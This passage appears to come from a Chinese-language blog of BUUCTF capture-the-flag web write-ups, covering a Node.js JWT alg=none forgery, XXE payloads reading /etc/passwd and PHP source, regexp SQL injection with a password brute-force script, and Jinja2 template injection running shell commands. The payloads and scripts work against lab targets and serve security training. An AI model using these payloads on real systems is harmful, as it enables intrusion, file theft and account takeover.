class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">crypto</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">fs</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">jwt</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br> <br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">APIError</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).APIError;<br> <br>module.exports = &#123;<br>    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br> <br>        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">global</span>.secrets.length &gt; <span class="hljs-number">100000</span>) &#123;<br>            <span class="hljs-keyword">global</span>.secrets = [];<br>        &#125;<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secret</span> = crypto.<span class="hljs-title function_ invoke__">randomBytes</span>(<span class="hljs-number">18</span>).<span class="hljs-title function_ invoke__">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secretid</span> = <span class="hljs-keyword">global</span>.secrets.length;<br>        <span class="hljs-keyword">global</span>.secrets.<span class="hljs-title function_ invoke__">push</span>(secret)<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">token</span> = jwt.<span class="hljs-title function_ invoke__">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br> <br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            <span class="hljs-attr">token</span>: token<br>        &#125;);<br> <br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br> <br>    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br> <br>        <span class="hljs-keyword">if</span>(!username || !password) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">token</span> = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sid</span> = JSON.<span class="hljs-title function_ invoke__">parse</span>(Buffer.<span class="hljs-keyword">from</span>(token.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>()).secretid;<br> <br>        console.<span class="hljs-title function_ invoke__">log</span>(sid)<br> <br>        <span class="hljs-keyword">if</span>(sid === undefined || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-keyword">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secret</span> = <span class="hljs-keyword">global</span>.secrets[sid];<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">user</span> = jwt.<span class="hljs-title function_ invoke__">verify</span>(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">status</span> = username === user.username &amp;&amp; password === user.password;<br> <br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            ctx.session.username = username;<br>        &#125;<br> <br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            status<br>        &#125;);<br> <br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br> <br>    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(ctx.session.username !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">flag</span> = fs.<span class="hljs-title function_ invoke__">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>();<br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            flag<br>        &#125;);<br> <br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br> <br>    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        ctx.session.username = <span class="hljs-literal">null</span>;<br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span><br>        &#125;)<br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>注册部分代码逻辑：</p>
<p>首先用户名不能为空且不能为<code>admin</code>用户，然后<code>secrets.length &gt; 100000</code>就置为空，可知当注册用户达到100000时就会清空原有密钥信息，下来的就是注册信息合法开始调用<code>jwt.sign()</code>进行JWT的生成，然后返回给用户，其中的密钥是随机生成的<code>crypto.randomBytes(18).toString(&#39;hex&#39;)</code>并与用户注册的sid进行绑定<code>const secretid = global.secrets.length;</code>，密钥的存储是在一个数组中，每当新增一个用户都会随机产生一个密钥进行存储。</p>
<p>登录部分代码逻辑：</p>
<p>首先用户名和密码不能为空，然后使用<code>JSON.parse()</code>对post的authorization字段进行提取sid，这个sid就是用户身份的唯一标志，依据逻辑<code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0))</code>可知sid不能为空并且sid需要大于等于0、小于密钥数组的实际长度，也就是说登录的用户在服务端需要能查出来，通过验证之后，下来由用户sid对global.secrets进行取值，也就是取得相应用户的密钥，然后进行用户验证，返回相应状态：验证成功的用户<code>status=true</code>否则为<code>false</code>。</p>
<p>简单来说，其代码逻辑可以看作数据库操作，通过用户标志查询数据库是否存在该用户记录，然后进行用户验证。</p>
<p>Getflag部分代码逻辑：其实就是验证登录用户是否为admin用户，普通用户会提示权限不足<code>throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);</code>。</p>
<p>Link: <a target="_blank" rel="noopener" href="https://qftm.github.io/2020/04/19/bypass-nodejs-jwt/#toc-heading-7">https://qftm.github.io/2020/04/19/bypass-nodejs-jwt/#toc-heading-7</a></p>
<p>抓取登录数据包</p>
<p><img src="https://i0.imgs.ovh/2024/03/07/QUtYl.png" srcset="/img/loading.gif" lazyload alt="image-20240308202610929"></p>
<p>jwt解密</p>
<p><img src="https://i0.imgs.ovh/2024/03/07/QUJrd.png" srcset="/img/loading.gif" lazyload alt="image-20240308202727764"></p>
<p>知识点：由于Node的jsonwebtoken库存在一个缺陷，当用户传入jwt secretid为空时 jsonwebtoken会采用algorithm none进行解密，即便在登录验证代码部分<code>const user = jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);</code>后面的算法指名为 HS256，验证也还是按照 none 来验证通过的。</p>
<p>通过传入不存在的secretid，导致algorithm为none，由于algorithm&#x3D;none所以在构造JWT时就不需要提供密钥，然后就可以通过伪造jwt来成为admin。</p>
<p>但是，我们可以看到实际的Node.js代码中做了限制，当sid不满足<code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0))</code>条件时就会错误<code>APIError(&#39;login error&#39;, &#39;no such secret id&#39;);</code>，所以要想构造管理员权限的JWT，就要绕过这个sid限制。</p>
<p>分析sid限制绕过：</p>
<p>根据if条件可知，<code>sid === undefined || sid === null</code>这部分逻辑很容易绕过，主要是<code>!(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)</code>这部分。要绕过这部分，既要构造sid不存在又要满足<code>0-global.secrets.length</code>这个范围，所以这里可以利用Node.js的弱类型特性来绕过限制，比如十六进制字符串进行绕过：<code>&quot;0x0&quot;</code>（或者使用小数绕过<code>0.11</code>等）</p>
<p>伪造jwt</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> base64<br><br>a = <span class="hljs-string">&#x27;&#123;&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#x27;</span><br>b = <span class="hljs-string">&#x27;&#123;&quot;secretid&quot;:[],&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123&quot;,&quot;iat&quot;:1709900631&#125;&#x27;</span><br><span class="hljs-title function_">print</span>(base64.<span class="hljs-title function_">b64encode</span>(a.<span class="hljs-title function_">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br><span class="hljs-title function_">print</span>(base64.<span class="hljs-title function_">b64encode</span>(b.<span class="hljs-title function_">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br></code></pre></td></tr></table></figure>

<p>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY2MDg5NTk3M30.</p>
<p><img src="https://i0.imgs.ovh/2024/03/07/QUiyj.png" srcset="/img/loading.gif" lazyload alt="image-20240308203217172"></p>
<p>放包，访问&#x2F;api&#x2F;flag得到flag</p>
<p><img src="https://i0.imgs.ovh/2024/03/07/QU5cV.png" srcset="/img/loading.gif" lazyload alt="image-20240308203416784"></p>
<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>xxe漏洞</p>
<p>随便输入数据抓个包</p>
<p><img src="https://i0.imgs.ovh/2024/03/11/RsfCK.png" srcset="/img/loading.gif" lazyload alt="image-20240312171620490"></p>
<p>抓到xml数据</p>
<p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害</p>
<p>palload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"> <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta"> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://i0.imgs.ovh/2024/03/11/RxP8J.png" srcset="/img/loading.gif" lazyload alt="image-20240312172425476"></p>
<p>php伪协议看看doLogin.php的源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"> <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/doLogin.php&quot;</span>&gt;</span></span><br><span class="hljs-meta"> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">  */</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br>	<span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>	<span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>	<span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br>	<span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br>	<span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br>	<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>	&#125;	<br><br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br>	<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>账号密码可以登录，但没什么用</p>
<p>读取一个&#x2F;proc&#x2F;net&#x2F;arp文件</p>
<p><img src="https://i0.imgs.ovh/2024/03/11/Rx0tC.png" srcset="/img/loading.gif" lazyload alt="image-20240312172734262">访问&#x2F;proc&#x2F;net&#x2F;arp文件时查看有无可利用内网主机等，然后通过爆破主机地址进行访问</p>
<p>用xxe内网探测存活的主机<br>两个ip都读取了<br>但是都显示504，正常应该报错然后再爆破最后一位<br>找了半天，说是由于buuctf转用了K8S管理，他的靶机容器是随机在80，81两个网段里的，具体情况看&#x2F;proc&#x2F;net&#x2F;fib_trie<br><img src="https://i0.imgs.ovh/2024/03/11/Rxs7N.png" srcset="/img/loading.gif" lazyload alt="image-20240312172839208"></p>
<p><img src="https://i0.imgs.ovh/2024/03/11/RxxDR.png" srcset="/img/loading.gif" lazyload alt="image-20240312173003136"></p>
<p><img src="https://i0.imgs.ovh/2024/03/11/RxbZp.png" srcset="/img/loading.gif" lazyload alt="image-20240312173032756"></p>
<h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p><img src="https://i0.imgs.ovh/2024/03/14/cEVIA.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>fuzz测试中大部分字符被过滤</p>
<p>用dirsearch扫描，发现robots.txt</p>
<p><img src="https://i0.imgs.ovh/2024/03/14/cEFRU.png" srcset="/img/loading.gif" lazyload alt="image-20240315193347004"></p>
<p>hint.txt</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-variable">$black_list</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|<span class="hljs-subst">\&#x27;</span>|=| |in|&lt;|&gt;|-|\.|<span class="hljs-subst">\(\)</span>|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;<br><br><br><span class="hljs-type">If</span> <span class="hljs-variable">$_POST</span>[&#x27;passwd&#x27;] <span class="hljs-operator">===</span> admin&#x27;s password,<br><br><span class="hljs-type">Then</span> you will <span class="hljs-keyword">get</span> the flag;<br></code></pre></td></tr></table></figure>

<p>regexp注入（正则注入）</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">passwd</span>=<span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>单引号被禁用，使用 \ 转义and前面的那个单引号，使得 ‘’ and passwd&#x3D;’ 形成闭合</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=\&amp;passwd=||sql<span class="hljs-comment">;%00</span><br></code></pre></td></tr></table></figure>

<p>因为题目过滤掉了空格，空格能用内联注释符&#x2F;**&#x2F;代替</p>
<p>注释符#和–  被过滤掉了，这里用;%00截断注释后面的内容</p>
<p>不能在输入框直接提交，会被url encode 变为%2500被黑名单拦截</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">passwd</span>=<span class="hljs-string">&#x27;||sql;%00&#x27;</span><br></code></pre></td></tr></table></figure>

<p>即</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">sql</span>;<span class="hljs-operator">%</span><span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>

<p>利用正则进行注入</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">username=\&amp;passwd=||<span class="hljs-regexp">/**/</span>passwd<span class="hljs-regexp">/**/</span>regexp<span class="hljs-regexp">/**/</span><span class="hljs-string">&quot;^x&quot;</span>;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">select * from users where <span class="hljs-regexp">/**/</span>passwd<span class="hljs-regexp">/**/</span>regexp<span class="hljs-regexp">/**/</span><span class="hljs-string">&quot;^x&quot;</span>;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>

<p>匹配正确的话会返回alert()</p>
<p>用python脚本进行爆破</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs vim">#buuctf web [NCTF2019]SQLi<br>import requests<br>import <span class="hljs-built_in">string</span><br><br><br>url = <span class="hljs-string">&quot;http://2e2494c3-b85d-49f4-81b8-63ee389a9c30.node4.buuoj.cn:81/&quot;</span><br>pw_fuzz = <span class="hljs-built_in">string</span>.ascii_lowercase + <span class="hljs-built_in">string</span>.digits + <span class="hljs-string">&quot;_&quot;</span>      #密码字典：小写字母和数字还有下划线<br><span class="hljs-keyword">pw</span> = <span class="hljs-string">&quot;&quot;</span>     #admin的密码<br><br><span class="hljs-keyword">while</span> True:<br>    <span class="hljs-keyword">for</span> i in pw_fuzz:<br>        data=&#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&#x27;\\&#x27;</span>,<br>            <span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;</span>.format((<span class="hljs-keyword">pw</span>+i))<br>        &#125;<br>        <span class="hljs-keyword">res</span> = requests.post(url=url,data=data).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;alert&quot;</span> not in <span class="hljs-keyword">res</span>:<br>            <span class="hljs-keyword">pw</span> = <span class="hljs-keyword">pw</span> + i<br>            <span class="hljs-keyword">print</span>(<span class="hljs-keyword">pw</span>)<br></code></pre></td></tr></table></figure>

<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">you_will_never_know<span class="hljs-number">7788990</span><br></code></pre></td></tr></table></figure>

<p>用admin登录获取flag</p>
<h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>可见flask，盲猜ssti</p>
<p><img src="https://i0.imgs.ovh/2024/03/16/e2vNK.png" srcset="/img/loading.gif" lazyload alt="image-20240317194543381"></p>
<p>用Arjun跑一下发现参数name<img src="https://i0.imgs.ovh/2024/03/16/eFP7j.png" srcset="/img/loading.gif" lazyload alt="image-20240317194648467"></p>
<p>通过下图判断为Jinja2模板</p>
<p>dfu</p>
<p>法1：可以使用tplmap工具直接得到getshell权限</p>
<p>法2：</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p>法3：</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>布尔盲注</p>
<p><img src="https://i0.imgs.ovh/2024/03/21/gXR60.png" srcset="/img/loading.gif" lazyload alt="image-20240322221805225"></p>
<p>输入1有回显 Hi admin, your score is: 100</p>
<p>最多到4</p>
<p>测试发现空格被过滤</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>     <span class="hljs-comment">#Hi admin, your score is: 100</span><br><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">0</span>     <span class="hljs-comment">#student number not exists.</span><br></code></pre></td></tr></table></figure>

<p>发现回显可以利用</p>
<p>用二分脚本注入，注意加sleep（）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> 